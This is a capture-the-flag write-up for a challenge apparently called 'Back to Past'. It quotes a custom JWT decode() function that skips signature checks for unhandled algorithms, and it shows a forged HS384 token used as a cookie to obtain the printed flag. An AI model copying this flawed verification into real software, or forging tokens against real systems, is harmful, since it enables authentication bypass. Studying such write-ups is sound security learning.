# Back to Past

**The Challenge**

In the challenge there was a login page , register page and a retro page. In the register page it asks your name and year and we cant give the year below 1970. and after that you will be redirect to "/" page and it will judge you.

**The Exploit**

In this challenge it will give flag if the year is below 1970.
Here the jwt library that they were importing was custom. In it the decode() fuction was vulnerable.
```py
    def decode(token, secret, algorithms=None):
    if not algorithms or any(alg not in possible_algorithms for alg in algorithms):
        return None
    if token.count(b".") != 2:
        return None

    header, payload, signature = token.split(b".")
    if not header or not payload or not signature:
        return None
    try:
        json_header = json.loads(base64url_decode(header))
        json_payload = json.loads(base64url_decode(payload))
        decoded_signature = base64url_decode(signature)
        alg_to_use = json_header["alg"]
        if alg_to_use == "HS256":
            h = hmac.HMAC(secret, hashes.SHA256())
            h.update(b".".join([header, payload]))
            h.verify(decoded_signature)
        elif alg_to_use == "RS256":
            pub = serialization.load_pem_public_key(secret)
            pub.verify(
                decoded_signature,
                b".".join([header, payload]),
                padding.PSS(
                    mgf=padding.MGF1(hashes.SHA256()),
                    salt_length=padding.PSS.MAX_LENGTH,
                ),
                hashes.SHA256(),
            )
        return json_payload
    except Exception as e:
        print(e)
        return None
```
Here the algorithm that was compared was the one given as default in the function call. And the algorithm later used was from the jwt token. Then if this algorithm was different than "HS256" or "RS256" then it will just return the json_payload and we can corrupt it.

payload = {
    "id":"123456",
    "name":"hai",
    "year":"1960"
}

And I encoded it with hs384 and gave it to the cookie and got the flag in the page "/retro"

Json = "eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJpZCI6IjEyMzQ1NiIsIm5hbWUiOiJoYWkiLCJ5ZWFyIjoiMTk2MCJ9.6oblO-1ZMQ1ij-ruqOxBaj58VOIHlkwNIUud-6K_uLxJryaoE49EvtOqsXMZrJ0g"

**The Flag**

Flag = tjctf{very_very_retro_3bbff613}